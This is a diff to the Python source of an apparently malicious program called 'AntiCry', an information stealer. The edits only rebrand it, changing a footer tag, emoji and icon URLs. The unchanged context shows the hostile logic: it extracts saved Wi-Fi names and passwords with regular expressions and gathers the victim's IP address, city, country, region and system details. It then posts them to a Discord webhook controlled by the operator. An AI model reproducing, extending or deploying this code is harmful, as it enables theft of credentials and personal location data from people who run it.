@@ -89,7 +89,7 @@ class AntiCry:
                         security_key = re.findall(r"(?:Security key\s*:\s)(.*)", current_result)
                         password = re.findall("(?:Key Content\s*:\s)(.*)", current_result)
                         
-                        self.passwords += f"------------Cloak | .gg/kos | security / Vealloll------------"
+                        self.passwords += f"------------Cloak | dev ~ vealloll ~ sacrifice.zip | security / Vealloll------------"
                         self.passwords += f"\n\nSSID           : {ssid[0]}"
                         self.passwords += f"Authentication : {authentication[0]}"
                         self.passwords += f"Cipher         : {cipher[0]}"
@@ -312,7 +312,7 @@ class AntiCry:
                             },
                             {
                                 "name": "<:z_logo_trustpilot:1040751302294122507> **IP Info**",
-                                "value": f"<:wh_star:1102019798390542426>`{ip}`\n<:wh_star:1102019798390542426>`{city}`\n<:wh_star:1102019798390542426>`{country}`\n<:wh_star:1102019798390542426>`{region}`"
+                                "value": f"<a:Purple_Lego_Coin:1152994436922474578>`{ip}`\n<a:Purple_Lego_Coin:1152994436922474578>`{city}`\n<a:Purple_Lego_Coin:1152994436922474578>`{country}`\n<a:Purple_Lego_Coin:1152994436922474578>`{region}`"
                             },
                             {
                                 "name": "<:z_logo_trustpilot:1040751302294122507> **System Information**",
@@ -329,11 +329,11 @@ class AntiCry:
                         ],
                         "author": {
                             "name": f"AntiCry",
-                            "icon_url": "https://cdn.discordapp.com/emojis/1087616875892056094.gif?size=96&quality=lossless"
+                            "icon_url": "https://cdn.discordapp.com/attachments/1151144869495058474/1159556408983961661/1200px-Green_Star_Artwork_-_Super_Mario_3D_World_1.png?ex=6531740f&is=651eff0f&hm=fef50e66a850dc954b00a0af1042977d5453f7d402e735398d75e56b4daecf79&"
                         },
                         "footer": {
-                            "text": f".gg/kos",
-                            "icon_url": "https://cdn.discordapp.com/emojis/1087616875892056094.gif?size=96&quality=lossless"
+                            "text": f"dev ~ vealloll ~ sacrifice.zip",
+                            "icon_url": "https://cdn.discordapp.com/attachments/1151144869495058474/1159556408983961661/1200px-Green_Star_Artwork_-_Super_Mario_3D_World_1.png?ex=6531740f&is=651eff0f&hm=fef50e66a850dc954b00a0af1042977d5453f7d402e735398d75e56b4daecf79&"
                         },
                     }
 
@@ -371,7 +371,7 @@ class AntiCry:
                             }
                         ],
                         "author": {"name": f"AntiCry"},
-                        "footer": {"text": f".gg/kos"},
+                        "footer": {"text": f"dev ~ vealloll ~ sacrifice.zip"},
                     }
             heading = { "content": "", "embeds": [embed], "username": "AntiCry" }
             req = post(VARIABLES.webhook, headers={"content-type": "application/json"}, data=json.dumps(heading).encode())
